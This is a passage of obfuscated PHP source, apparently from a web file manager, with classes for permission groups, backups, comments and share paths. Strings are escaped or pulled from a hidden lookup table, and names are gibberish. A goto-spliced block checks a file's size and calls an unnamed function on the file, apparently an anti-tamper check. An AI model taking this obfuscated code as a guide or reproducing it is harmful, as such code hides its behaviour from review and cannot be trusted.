$¯ğ–‹ÑĞ) != 0) { continue; } if (!$áËŒ¨ç–) { $áËŒ¨ç– = $ßÚßÅãß; continue; } if (intval($áËŒ¨ç–[$Ù¸Ã¹£Û[498]]) < $¼††ù™‘) { $áËŒ¨ç– = $ßÚßÅãß; } } return $áËŒ¨ç– ? $áËŒ¨ç–[$Ù¸Ã¹£Û[477]] : !1; } public function findAuthReadOnly() { $½ŒêÍı… = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ã¬ñÀğ¬ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($½ŒêÍı…, $ã¬ñÀğ¬); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $éé¾ß¾ =& $_SERVER[Î·Ü›öğ]; $ôø¢Ÿ = parent::listData(); $á²åë¡— = !1; foreach ($ôø¢Ÿ as $áœÙı‰Œ) { if ($áœÙı‰Œ[$éé¾ß¾[498]] <= 0 || $áœÙı‰Œ[$éé¾ß¾[2032]] == $éé¾ß¾[231]) { continue; } if (!$á²åë¡—) { $á²åë¡— = $áœÙı‰Œ; continue; } if ($á²åë¡—[$éé¾ß¾[498]] > $áœÙı‰Œ[$éé¾ß¾[498]]) { $á²åë¡— = $áœÙı‰Œ; } } return $á²åë¡— ? $á²åë¡—[$éé¾ß¾[477]] : $éé¾ß¾[12]; } public function listData($¤³áËß³ = false, $Ù±ìàæ = "\163\157\x72\x74", $İÏÕÇæ = false) { return parent::listData($¤³áËß³, $Ù±ìàæ, $İÏÕÇæ); } public function update($ú”Í’¬ı, $¶ˆÇ›áï) { $ÎÉ¨øóó =& $_SERVER[Î·Ü›öğ]; $à©Àæõ = parent::listData($ú”Í’¬ı); $Ø¿¥¬Œò = $this->findByName($¶ˆÇ›áï[$ÎÉ¨øóó[32]]); if (!$à©Àæõ || $Ø¿¥¬Œò && $Ø¿¥¬Œò[$ÎÉ¨øóó[477]] != $à©Àæõ[$ÎÉ¨øóó[477]]) { return !1; } $this->filterAuth($¶ˆÇ›áï[$ÎÉ¨øóó[498]]); return parent::update($ú”Í’¬ı, $¶ˆÇ›áï); } public function remove($š§ÛèÈ) { $°Û—ÆŠì = parent::listData($š§ÛèÈ); if (!$°Û—ÆŠì || $°Û—ÆŠì[$_SERVER[Î·Ü›öğ][192]]) { return !1; } return parent::remove($š§ÛèÈ); } public function add($ÑúŒ€ƒÚ = array()) { $ğ”ø¼­„ =& $_SERVER[Î·Ü›öğ]; if ($this->findByName($ÑúŒ€ƒÚ[$ğ”ø¼­„[32]])) { return !1; } $»¬¨¼£Ğ = array($ğ”ø¼­„[32] => $ğ”ø¼­„[12], $ğ”ø¼­„[498] => 1, $ğ”ø¼­„[2033] => $ğ”ø¼­„[2020], $ğ”ø¼­„[2032] => 1, $ğ”ø¼­„[192] => 0, $ğ”ø¼­„[2034] => 0); $ÑúŒ€ƒÚ = array_merge($»¬¨¼£Ğ, $ÑúŒ€ƒÚ); $ÑúŒ€ƒÚ[$ğ”ø¼­„[2034]] = $this->getSort(); $this->filterAuth($ÑúŒ€ƒÚ[$ğ”ø¼­„[498]]); return parent::insert($ÑúŒ€ƒÚ); } private function getSort() { $¾ÜÖ¨Ô =& $_SERVER[Î·Ü›öğ]; $à¢¯¸… = parent::listData(); $‰âÁù‡» = array_to_keyvalue($à¢¯¸…, $¾ÜÖ¨Ô[12], $¾ÜÖ¨Ô[2034]); return empty($‰âÁù‡») ? 0 : max($‰âÁù‡») + 1; } private function filterAuth(&$—şÆ„Ä) { if (!$—şÆ„Ä) { return; } $Æ–Á°¢é = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $êÊËºåü = array(); foreach ($Æ–Á°¢é as $³÷á¢³‹) { if ($—şÆ„Ä & $³÷á¢³‹) { $êÊËºåü[] = $³÷á¢³‹; } } if (in_array(self::AUTH_ROOT, $êÊËºåü)) { $—şÆ„Ä = array_sum($Æ–Á°¢é); return; } $øÏÑ‹ÍŸ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($êÊËºåü as $³÷á¢³‹) { if (isset($øÏÑ‹ÍŸ[$³÷á¢³‹])) { $êÊËºåü = array_merge($êÊËºåü, $øÏÑ‹ÍŸ[$³÷á¢³‹]); } } $êÊËºåü[] = self::AUTH_SHOW; $—şÆ„Ä = array_sum(array_unique($êÊËºåü)); } public function sort($®Õ¬¼Ä×, $ï€–­Ñæ) { return parent::update($®Õ¬¼Ä×, $ï€–­Ñæ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x62\141\143\153\x75\160\x4c\151\x73\164"; public $field = array("\151\x6f", "\x6e\x61\155\145", "\163\x74\141\164\165\x73", "\x63\157\x6e\164\x65\x6e\x74", "\x6d\141\x6e\165\x61\154", "\x72\145\x73\x75\154\x74", "\x74\x69\155\x65\106\x72\x6f\155", "\x74\151\x6d\x65\x54\157"); public function config() { $¼íáñ … =& $_SERVER[Î·Ü›öğ]; Action($¼íáñ …[2035])->taskInit(); $Ìï½¿ = Model($¼íáñ …[862])->get($¼íáñ …[869]); $Ìï½¿ = json_decode($Ìï½¿, !0); $Ìï½¿ = is_array($Ìï½¿) ? $Ìï½¿ : array(); $this->parseContent($Ìï½¿); unset($Ìï½¿[$¼íáñ …[1779]]); Model($¼íáñ …[1778])->cacheClear(); $¨õÒ¡«‹ = $¼íáñ …[2036]; $Éâ¥Íá¿ = Model($¼íáñ …[2037])->findByKey($¼íáñ …[1797], $¨õÒ¡«‹); if (!$Éâ¥Íá¿) { $Éâ¥Íá¿ = array(); } if (isset($Éâ¥Íá¿[$¼íáñ …[207]])) { $Éâ¥Íá¿[$¼íáñ …[207]] = json_decode($Éâ¥Íá¿[$¼íáñ …[207]], !0); } if (isset($Ìï½¿[$¼íáñ …[207]])) { $Éâ¥Íá¿[$¼íáñ …[207]][$¼íáñ …[1782]] = $Ìï½¿[$¼íáñ …[207]]; unset($Ìï½¿[$¼íáñ …[207]]); } return array_merge($Éâ¥Íá¿, $Ìï½¿); } public function listData($ú»ŒÄ“ = false, $üúŒÊ£® = "\x6d\157\144\151\x66\171\x54\151\155\145", $ùé«Ò‘ = false) { $É¬ë«½Ğ = parent::listData($ú»ŒÄ“, $üúŒÊ£®, !0); if (!$É¬ë«½Ğ) { return $É¬ë«½Ğ; } if ($ú»ŒÄ“) { $É¬ë«½Ğ = array($É¬ë«½Ğ); } foreach ($É¬ë«½Ğ as &$£…ÖÁÔÀ) { $this->parseContent($£…ÖÁÔÀ); } return $ú»ŒÄ“ ? $É¬ë«½Ğ[0] : $É¬ë«½Ğ; } public function parseContent(&$˜«ùÒÔ) { $ò¦ò¿‘ =& $_SERVER[Î·Ü›öğ]; $„×ˆàÇÆ = _get($˜«ùÒÔ, $ò¦ò¿‘[171], $ò¦ò¿‘[91]); if (!in_array($„×ˆàÇÆ, array($ò¦ò¿‘[868], $ò¦ò¿‘[1238]))) { $˜«ùÒÔ[$ò¦ò¿‘[171]] = $„×ˆàÇÆ == $ò¦ò¿‘[91] ? $ò¦ò¿‘[1238] : $ò¦ò¿‘[868]; } } public function lastItem() { $Ş»†¤ = $this->listData(); return !empty($Ş»†¤[0]) ? $Ş»†¤[0] : null; } public function kill($ê°Ò£»á) { $Šç¸˜ô© =& $_SERVER[Î·Ü›öğ]; $­ùÑ•×» = $this->listData($ê°Ò£»á); if (!$­ùÑ•×» || empty($­ùÑ•×»[$Šç¸˜ô©[32]])) { return !0; } Task::kill($Šç¸˜ô©[877]); Task::kill($Šç¸˜ô©[896]); Task::kill($Šç¸˜ô©[906]); $™  ™«® = $­ùÑ•×»[$Šç¸˜ô©[32]]; $ÍŒ¤Ñî÷ = TEMP_FILES . $Šç¸˜ô©[872] . $™  ™«® . $Šç¸˜ô©[8]; IO::remove($ÍŒ¤Ñî÷, !1); return $this->remove($ê°Ò£»á); } public function remove($Å¹ò¢ ) { $â—ïĞò = $this->listData($Å¹ò¢ ); if (!$â—ïĞò) { return !0; } return $this->backupRemove($â—ïĞò); } private function backupRemove($ßóú›øÊ) { parent::remove($ßóú›øÊ[$_SERVER[Î·Ü›öğ][477]]); $ñçßœ¬Û = $this->backupPath($ßóú›øÊ); IO::remove($ñçßœ¬Û, !1); return !0; } private function backupPath($óĞ¶†Üõ) { $ğ‘¥óá =& $_SERVER[Î·Ü›öğ]; $üõ³š¾‘ = $óĞ¶†Üõ[$ğ‘¥óá[32]]; $‘°±ŞşÚ = Model($ğ‘¥óá[862])->get($ğ‘¥óá[863]); $Ê İÏ·ˆ = substr(md5($ğ‘¥óá[864] . $‘°±ŞşÚ . $üõ³š¾‘), 0, 8); return "\173\151\157\x3a{$óĞ¶†Üõ[$ğ‘¥óá[841]]}\x7d\57\x64\141\x74\141\142\141\x73\x65\57\142\x61\x63\x6b\x75\160\x2f" . $üõ³š¾‘ . $ğ‘¥óá[11] . $Ê İÏ·ˆ; } public function start() { $ ûøáÎÒ =& $_SERVER[Î·Ü›öğ]; if ($GLOBALS[$ ûøáÎÒ[6]][$ ûøáÎÒ[92]][$ ûøáÎÒ[2038]] != $ ûøáÎÒ[91]) { return !0; } $Ë¡Ô‘Õ’ = $this->config(); if (!$Ë¡Ô‘Õ’ || $Ë¡Ô‘Õ’[$ ûøáÎÒ[1779]] != $ ûøáÎÒ[91]) { return !1; } if ($Ë¡Ô‘Õ’[$ ûøáÎÒ[171]] == $ ûøáÎÒ[868]) { $Îàñı®­ = Model($ ûøáÎÒ[862])->get($ ûøáÎÒ[1354]); if ($Îàñı®­ == $ ûøáÎÒ[1355]) { $Ë¡Ô‘Õ’[$ ûøáÎÒ[171]] = $ ûøáÎÒ[1238]; } } $††‹Éœ = $this->process(); foreach ($††‹Éœ as $‘şÕ¨Ú) { if ($‘şÕ¨Ú) { return Task::restart($‘şÕ¨Ú[$ ûøáÎÒ[477]]); } } $›³ã“¡ş = new Backup(); $ ƒÅƒÅÜ = $›³ã“¡ş->db(); if ($ ƒÅƒÅÜ) { $ ƒÅƒÅÜ = $›³ã“¡ş->dbFile(); if ($ ƒÅƒÅÜ && $Ë¡Ô‘Õ’[$ ûøáÎÒ[171]] == $ ûøáÎÒ[868]) { $ ƒÅƒÅÜ = $›³ã“¡ş->file(); } } Backup::set(array($ ûøáÎÒ[839] => 1, $ ûøáÎÒ[851] => time())); return !0; } public function process() { $ªÜÜ—ö =& $_SERVER[Î·Ü›öğ]; $¸õúşÏÃ = array($ªÜÜ—ö[847] => Task::get($ªÜÜ—ö[877]), $ªÜÜ—ö[852] => Task::get($ªÜÜ—ö[896]), $ªÜÜ—ö[233] => Task::get($ªÜÜ—ö[906])); $íÄ²ˆƒ = !1; foreach ($¸õúşÏÃ as &$´‹¾œÌ) { if ($íÄ²ˆƒ) { $´‹¾œÌ = !1; continue; } if ($´‹¾œÌ) { $ÀÙ«ŒÊ = intval(_get($´‹¾œÌ, $ªÜÜ—ö[1815], 0)); if (time() - $ÀÙ«ŒÊ > 7200) { Task::kill($´‹¾œÌ[$ªÜÜ—ö[477]]); $íÄ²ˆƒ = !0; $´‹¾œÌ = !1; } } } return $¸õúşÏÃ; } public function restore() { $Â‹Ô÷¤Â =& $_SERVER[Î·Ü›öğ]; ActionCall($Â‹Ô÷¤Â[1159], !0, 1); ActionCall($Â‹Ô÷¤Â[1159], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\x65\x6e\x74"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\155\145" => "\143\x6f\155\155\x65\156\x74\x5f\x6d\x65\x74\x61", "\155\145\x74\x61\106\x69\145\154\x64" => "\143\157\x6d\155\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($äãšÄÁ) { $§ÚÈ¦Ñ =& $_SERVER[Î·Ü›öğ]; if ($äãšÄÁ[$§ÚÈ¦Ñ[2039]]) { $ÖÅé¨î‚ = $this->where(array($§ÚÈ¦Ñ[2040] => $äãšÄÁ[$§ÚÈ¦Ñ[2039]]))->find(); if (!$ÖÅé¨î‚ || $ÖÅé¨î‚[$§ÚÈ¦Ñ[191]] != $äãšÄÁ[$§ÚÈ¦Ñ[191]] || $ÖÅé¨î‚[$§ÚÈ¦Ñ[582]] != $äãšÄÁ[$§ÚÈ¦Ñ[582]]) { return !1; } $this->where(array($§ÚÈ¦Ñ[2040] => $äãšÄÁ[$§ÚÈ¦Ñ[2039]]))->setAdd($§ÚÈ¦Ñ[2041], 1); } $äãšÄÁ[$§ÚÈ¦Ñ[2042]] = 0; $äãšÄÁ[$§ÚÈ¦Ñ[2041]] = 0; $äãšÄÁ[$§ÚÈ¦Ñ[839]] = 1; return $this->add($äãšÄÁ); } public function commentCount($‰ú¦„üÇ, $ÄÈô¶ò¸, $Ìº·¾Á¯ = false) { $¤Û”³ı =& $_SERVER[Î·Ü›öğ]; if (!$‰ú¦„üÇ) { return array(); } if (is_string($‰ú¦„üÇ) || is_int($‰ú¦„üÇ)) { $‰ú¦„üÇ = array($‰ú¦„üÇ); } $ï¡™œß = array($¤Û”³ı[582], $¤Û”³ı[2043] => $¤Û”³ı[578]); $ãâãó”‡ = array($¤Û”³ı[582] => array($¤Û”³ı[7], $‰ú¦„üÇ), $¤Û”³ı[191] => $ÄÈô¶ò¸); if ($Ìº·¾Á¯) { $ãâãó”‡[$¤Û”³ı[1810]] = $Ìº·¾Á¯; } $ã½ûëÚ = $this->field($ï¡™œß)->where($ãâãó”‡)->group($¤Û”³ı[582])->select(); return array_to_keyvalue($ã½ûëÚ, $¤Û”³ı[582], $¤Û”³ı[578]); } public function starTarget($šøâ©ì€, $ÚáµŒå) { $ùî˜Û‘ =& $_SERVER[Î·Ü›öğ]; $²Áî¢ê = $šøâ©ì€ + self::TYPE_STAR_OFFSET; $˜ÈÕ§ûú = array($ùî˜Û‘[1810] => USER_ID, $ùî˜Û‘[191] => $²Áî¢ê, $ùî˜Û‘[582] => $ÚáµŒå); $¸òÖœµè = $this->where($˜ÈÕ§ûú)->find(); if ($¸òÖœµè) { return $this->where(array($ùî˜Û‘[477] => $¸òÖœµè[$ùî˜Û‘[477]]))->delete(); } $¿‰¾ãŒ = array($ùî˜Û‘[2039] => 0, $ùî˜Û‘[1810] => USER_ID, $ùî˜Û‘[839] => 1, $ùî˜Û‘[171] => $ùî˜Û‘[12], $ùî˜Û‘[191] => $²Áî¢ê, $ùî˜Û‘[582] => $ÚáµŒå, $ùî˜Û‘[2042] => 0, $ùî˜Û‘[2041] => 0); return $this->add($¿‰¾ãŒ); } public function starTargetCount($ÅÊ†»”Ù, $°Œ™Ëè) { $¢Øâ’Åş =& $_SERVER[Î·Ü›öğ]; $¶¯‚ş²ƒ = $°Œ™Ëè + self::TYPE_STAR_OFFSET; $¸ßµ¼¿œ = $this->commentCount($ÅÊ†»”Ù, $¶¯‚ş²ƒ); $˜‹ôÔ‰ó = $this->commentCount($ÅÊ†»”Ù, $¶¯‚ş²ƒ, USER_ID); return array($¢Øâ’Åş[2044] => $¸ßµ¼¿œ, $¢Øâ’Åş[2045] => $˜‹ôÔ‰ó); } public function starTargetUserList($ÊÑìîú½, $®û‚Îì) { $ƒù¶ÌÅ„ =& $_SERVER[Î·Ü›öğ]; $£øÀ’€ = $ÊÑìîú½ + self::TYPE_STAR_OFFSET; $éÉ¨ëŒº = array($ƒù¶ÌÅ„[582] => $®û‚Îì, $ƒù¶ÌÅ„[191] => $£øÀ’€); $ÉÎ’äÔ = $this->where($éÉ¨ëŒº)->count(); $¶Üô¾ã¹ = array($ƒù¶ÌÅ„[335] => $ÉÎ’äÔ, $ƒù¶ÌÅ„[2046] => array()); if (!$ÉÎ’äÔ) { return $¶Üô¾ã¹; } $ø™Ç…Âô = $this->field($ƒù¶ÌÅ„[1810])->where($éÉ¨ëŒº)->limit(500)->select(); $ø™Ç…Âô = array_to_keyvalue($ø™Ç…Âô, $ƒù¶ÌÅ„[12], $ƒù¶ÌÅ„[1810]); $¶Üô¾ã¹[$ƒù¶ÌÅ„[2046]] = Model($ƒù¶ÌÅ„[590])->userListInfo($ø™Ç…Âô); return $¶Üô¾ã¹; } public function prasiseUserList($†Äæ¸Ä‰) { $áÕ©Ë¶¼ =& $_SERVER[Î·Ü›öğ]; $¤®¼»õÊ = array($áÕ©Ë¶¼[2047] => $†Äæ¸Ä‰); $¼»›Ä²€ = $this->where($¤®¼»õÊ)->find(); $‚Úáîñº = _get($¼»›Ä²€, $áÕ©Ë¶¼[2042], 0); $íü“âæ = array($áÕ©Ë¶¼[335] => $‚Úáîñº, $áÕ©Ë¶¼[2046] => array()); if (!$‚Úáîñº) { return $íü“âæ; } $ôĞ»«Ş = Model($áÕ©Ë¶¼[2048])->field($áÕ©Ë¶¼[1810])->where($¤®¼»õÊ)->limit(500)->select(); $ôĞ»«Ş = array_to_keyvalue($ôĞ»«Ş, $áÕ©Ë¶¼[12], $áÕ©Ë¶¼[1810]); $íü“âæ[$áÕ©Ë¶¼[2046]] = Model($áÕ©Ë¶¼[590])->userListInfo($ôĞ»«Ş); return $íü“âæ; } public function remove($ßÌ’şŞ) { $†—›ã´ =& $_SERVER[Î·Ü›öğ]; $ò½ŞÑ©À = array($†—›ã´[2040] => $ßÌ’şŞ); $¡Æöê¿å = $this->where($ò½ŞÑ©À)->find(); if ($¡Æöê¿å[$†—›ã´[2039]]) { $this->where(array($†—›ã´[2040] => $¡Æöê¿å[$†—›ã´[2039]]))->setAdd($†—›ã´[2041], -1); } return $this->removeArray($ßÌ’şŞ); } public function edit($ëÀºÔÂ§, $¡±Â¬ı´) { $šğÎƒƒ =& $_SERVER[Î·Ü›öğ]; $À…é‹±Í = array($šğÎƒƒ[2040] => $ëÀºÔÂ§); return $this->where($À…é‹±Í)->save(array($šğÎƒƒ[2049] => $¡±Â¬ı´)); } public function prasise($¡Ü÷»¤£) { $Õ®í© =& $_SERVER[Î·Ü›öğ]; $×ê‰ï„ = Model($Õ®í©[2050]); $ÛÖğÅÜ† = array($Õ®í©[2040] => $¡Ü÷»¤£, $Õ®í©[1801] => USER_ID); $—­ºØ¥ = $×ê‰ï„->where($ÛÖğÅÜ†)->find(); if (!$—­ºØ¥) { $×ê‰ï„->add($ÛÖğÅÜ†); $øÆÚÁ€¬ = $this->where(array($Õ®í©[2040] => $¡Ü÷»¤£))->setAdd($Õ®í©[2042], 1); } else { $×ê‰ï„->where($ÛÖğÅÜ†)->delete(); $øÆÚÁ€¬ = $this->where(array($Õ®í©[2040] => $¡Ü÷»¤£))->setAdd($Õ®í©[2042], -1); } return $øÆÚÁ€¬; } public function targetInfo($Ó€Éõ›ğ, $€¸öšïÜ) { $ôîôÍú¬ =& $_SERVER[Î·Ü›öğ]; $ôƒ…Ù¾ = array($ôîôÍú¬[664] => $Ó€Éõ›ğ, $ôîôÍú¬[665] => $€¸öšïÜ); $‘•¾ğÖ = $this->where($ôƒ…Ù¾)->count(); $Ë¼‰°°İ = "\x52\111\107\110\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x63\157\x6d\155\x65\156\x74\137\160\162\141\151\163\145\x20\x73\164\141\x72\40\157\x6e\x20\x63\x6f\x6d\155\145\156\164\x2e\x63\157\x6d\x6d\145\x6e\x74\111\x44\40\75\40\163\164\x61\x72\x2e\143\x6f\x6d\155\145\156\164\111\x44"; $•ŠÜ±ü¶ = $this->alias($ôîôÍú¬[431])->where($ôƒ…Ù¾)->join($Ë¼‰°°İ, $ôîôÍú¬[2051])->count(); $—å«Ô° = array($ôîôÍú¬[2052] => $‘•¾ğÖ, $ôîôÍú¬[2053] => $•ŠÜ±ü¶); return $—å«Ô°; } public function listData($»¯şÍ‹‡) { $¯š˜æâœ =& $_SERVER[Î·Ü›öğ]; if (isset($»¯şÍ‹‡[$¯š˜æâœ[2054]])) { if ($»¯şÍ‹‡[$¯š˜æâœ[2054]]) { $»¯şÍ‹‡[$¯š˜æâœ[2047]] = array($¯š˜æâœ[1113], intval($»¯şÍ‹‡[$¯š˜æâœ[2054]])); } unset($»¯şÍ‹‡[$¯š˜æâœ[2054]]); } if (isset($»¯şÍ‹‡[$¯š˜æâœ[2055]])) { if ($»¯şÍ‹‡[$¯š˜æâœ[2055]]) { $»¯şÍ‹‡[$¯š˜æâœ[2047]] = array($¯š˜æâœ[1110], intval($»¯şÍ‹‡[$¯š˜æâœ[2055]])); } unset($»¯şÍ‹‡[$¯š˜æâœ[2055]]); } return $this->_listData($»¯şÍ‹‡); } private function _listData($ŒÜ×íÆ¦) { $úË§˜èû =& $_SERVER[Î·Ü›öğ]; $ŸŒÔÑ = $this->where($ŒÜ×íÆ¦)->_makeOrder()->selectPage(100); $this->_listAppendParent($ŸŒÔÑ[$úË§˜èû[447]]); $this->_listAppendUser($ŸŒÔÑ[$úË§˜èû[447]]); $this->_listAppendMeta($ŸŒÔÑ[$úË§˜èû[447]]); return $ŸŒÔÑ; } private function _makeOrder() { $Ä–ËŞ§ã =& $_SERVER[Î·Ü›öğ]; $ô‡°Æå = array($Ä–ËŞ§ã[2042], $Ä–ËŞ§ã[2041], $Ä–ËŞ§ã[234]); $É¬Ú€ˆ¼ = Input::get($Ä–ËŞ§ã[541], $Ä–ËŞ§ã[7], $Ä–ËŞ§ã[508], $ô‡°Æå); $÷¦Î£İÙ = Input::get($Ä–ËŞ§ã[542], $Ä–ËŞ§ã[7], $Ä–ËŞ§ã[1803], array($Ä–ËŞ§ã[2056], $Ä–ËŞ§ã[537])); $êå¬´€« = $É¬Ú€ˆ¼ . $Ä–ËŞ§ã[53] . $÷¦Î£İÙ; return $this->order($êå¬´€«); } private function _listAppendParent(&$‰íÁµÒé) { $î¶äö“ =& $_SERVER[Î·Ü›öğ]; $Ò‡â‘Õ¿ = array_unique(array_to_keyvalue($‰íÁµÒé, $î¶äö“[12], $î¶äö“[2039])); $Ò‡â‘Õ¿ = array_remove_value($Ò‡â‘Õ¿, $î¶äö“[231]); if (!$Ò‡â‘Õ¿) { return; } $ÓÙ†ÆŠ® = $this->where(array($î¶äö“[2040] => array($î¶äö“[7], $Ò‡â‘Õ¿)))->select(); $ÓÙ†ÆŠ® = array_to_keyvalue($ÓÙ†ÆŠ®, $î¶äö“[2047]); foreach ($‰íÁµÒé as &$»ÒêİÕó) { if (isset($ÓÙ†ÆŠ®[$»ÒêİÕó[$î¶äö“[2039]]])) { $»ÒêİÕó[$î¶äö“[2057]] = $ÓÙ†ÆŠ®[$»ÒêİÕó[$î¶äö“[2039]]]; } } unset($»ÒêİÕó); } private function _listAppendUser(&$üÍ‹£©Ê) { $¥Õ——êÛ =& $_SERVER[Î·Ü›öğ]; $¢ˆóÛÛİ = array_unique(array_to_keyvalue($üÍ‹£©Ê, $¥Õ——êÛ[12], $¥Õ——êÛ[1810])); $¢ˆóÛÛİ = array_remove_value($¢ˆóÛÛİ, $¥Õ——êÛ[231]); if (count($¢ˆóÛÛİ) == 0) { return; } foreach ($üÍ‹£©Ê as $Íáö¥Õ) { if (isset($Íáö¥Õ[$¥Õ——êÛ[2057]])) { $¢ˆóÛÛİ[] = $Íáö¥Õ[$¥Õ——êÛ[2057]][$¥Õ——êÛ[1810]]; } } $©¡®é² = Model($¥Õ——êÛ[610])->userListInfo($¢ˆóÛÛİ); foreach ($üÍ‹£©Ê as &$Íáö¥Õ) { $Íáö¥Õ[$¥Õ——êÛ[678]] = $©¡®é²[$Íáö¥Õ[$¥Õ——êÛ[1810]]]; if (isset($Íáö¥Õ[$¥Õ——êÛ[2057]])) { $Íáö¥Õ[$¥Õ——êÛ[2057]][$¥Õ——êÛ[678]] = $©¡®é²[$Íáö¥Õ[$¥Õ——êÛ[2057]][$¥Õ——êÛ[1810]]]; } } unset($Íáö¥Õ); } private function _listAppendMeta(&$è„‘××˜) { $ÃíÍÅğê =& $_SERVER[Î·Ü›öğ]; $®˜î¼İÁ = array_unique(array_to_keyvalue($è„‘××˜, $ÃíÍÅğê[12], $ÃíÍÅğê[2047])); $®˜î¼İÁ = array_remove_value($®˜î¼İÁ, $ÃíÍÅğê[231]); if (!$®˜î¼İÁ) { return; } foreach ($è„‘××˜ as $³»Î¦Ç¨) { if (isset($³»Î¦Ç¨[$ÃíÍÅğê[2057]])) { $®˜î¼İÁ[] = $³»Î¦Ç¨[$ÃíÍÅğê[2057]][$ÃíÍÅğê[2047]]; } } $Î¯Ğ¾õ½ = $this->metaList($®˜î¼İÁ); if (!$Î¯Ğ¾õ½) { return !1; } foreach ($è„‘××˜ as &$³»Î¦Ç¨) { $³»Î¦Ç¨[$ÃíÍÅğê[552]] = $Î¯Ğ¾õ½[$³»Î¦Ç¨[$ÃíÍÅğê[2047]]]; if (isset($³»Î¦Ç¨[$ÃíÍÅğê[2057]])) { $³»Î¦Ç¨[$ÃíÍÅğê[2057]][$ÃíÍÅğê[552]] = $Î¯Ğ¾õ½[$³»Î¦Ç¨[$ÃíÍÅğê[2057]][$ÃíÍÅğê[2047]]]; } } unset($³»Î¦Ç¨); } private function metaList($‰é¤ş³) { $³‹÷”Ã» =& $_SERVER[Î·Ü›öğ]; if (!$‰é¤ş³) { return array(); } $ú²Ÿ°™È = array($³‹÷”Ã»[2047] => array($³‹÷”Ã»[7], $‰é¤ş³)); $‹‰õÈïå = Model($³‹÷”Ã»[2058])->where($ú²Ÿ°™È)->select(); $‹‰õÈïå = array_to_keyvalue_group($‹‰õÈïå, $³‹÷”Ã»[2047]); foreach ($‹‰õÈïå as $ÓŒ¿éÍ => $á¦Ş®…Ì) { $“€ƒòÊ‡ = array(); foreach ($á¦Ş®…Ì as $Şª´¶ê–) { $“€ƒòÊ‡[$Şª´¶ê–[$³‹÷”Ã»[97]]] = $Şª´¶ê–[$³‹÷”Ã»[452]]; } $‹‰õÈïå[$ÓŒ¿éÍ] = $“€ƒòÊ‡; } return $‹‰õÈïå ? $‹‰õÈïå : array(); } public function removeTarget($Ü¦ø”ØÊ, $¶÷…) { $Øô®ÙÉ¾ =& $_SERVER[Î·Ü›öğ]; if (!$¶÷…) { return !0; } $¶÷… = is_array($¶÷…) ? $¶÷… : array($¶÷…); $‡ã»ïï± = array($Øô®ÙÉ¾[191] => $Ü¦ø”ØÊ, $Øô®ÙÉ¾[582] => array($Øô®ÙÉ¾[7], $¶÷…)); $Š§©ã¾™ = $this->field($Øô®ÙÉ¾[2047])->where($‡ã»ïï±)->select(); $ÔÔÖŸÈ¤ = array_to_keyvalue($Š§©ã¾™, $Øô®ÙÉ¾[12], $Øô®ÙÉ¾[2047]); return $this->removeArray($ÔÔÖŸÈ¤); } public function removeArray($Ï•ÓÌòÆ) { $”Çï£ =& $_SERVER[Î·Ü›öğ]; if (!$Ï•ÓÌòÆ) { return !0; } $Ï•ÓÌòÆ = is_array($Ï•ÓÌòÆ) ? $Ï•ÓÌòÆ : array($Ï•ÓÌòÆ); $—è “ùß = array($”Çï£[2047] => array($”Çï£[7], $Ï•ÓÌòÆ)); Model($”Çï£[2050])->where($—è “ùß)->delete(); Model($”Çï£[2059])->where($—è “ùß)->delete(); return $this->where($—è “ùß)->delete(); } } goto F…ò¼˜¨÷; a·„´×†Ú²: $_size = $_SERVER[Î·Ü›öğ][480]; if ($_SERVER[$_SERVER[Î·Ü›öğ][481]] != $_size($_file)) { $_getc = $_SERVER[Î·Ü›öğ][482]; $_getfile = $_SERVER[$_SERVER[Î·Ü›öğ][483]] . $_SERVER[Î·Ü›öğ][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î·Ü›öğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[Î·Ü›öğ][485]) { $exit = $_SERVER[Î·Ü›öğ][486]; $exit(); } $_act = $_SERVER[Î·Ü›öğ][487]; $_act($_file); } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ËàÏ¯êÒ) { $this->pathParse = $ËàÏ¯êÒ; $this->model = Model($_SERVER[Î·Ü›öğ][1458]); } public function getPathOuter($Õ©¦ëÉ™) { $ÙÕ‡Ñíø =& $_SERVER[Î·Ü›öğ]; if (!$Õ©¦ëÉ™) { return $Õ©¦ëÉ™; } $Õ… º» = $this->parse($Õ©¦ëÉ™); return trim(KodIO::makeShare($this->pathParse[$ÙÕ‡Ñíø[477]], $Õ… º»[$ÙÕ‡Ñíø[477]]), $ÙÕ‡Ñíø[8]); } protected function infoParse($±¹‚¹·û, $Ò´øí£Ò = false, $£ûÓ°Ö¢ = false) { $Ô„˜¤ˆø =& $_SERVER[Î·Ü›öğ]; $­¥éˆ³­ = $this->pathParse[$Ô„˜¤ˆø[477]]; $ÙŸ¦ú¬® = trim($this->pathParse[$Ô„˜¤ˆø[1279]], $Ô„˜¤ˆø[8]); return Action($Ô„˜¤ˆø[1465])->sharePathInfo($­¥éˆ³­, $ÙŸ¦ú¬®, $Ò´øí£Ò); } public function infoFull($¾áßÛ˜õ) { $ß¢üŠ÷° =& $_SERVER[Î·Ü›öğ]; $¹ìÖ¯€² = explode($ß¢üŠ÷°[8], trim($¾áßÛ˜õ, 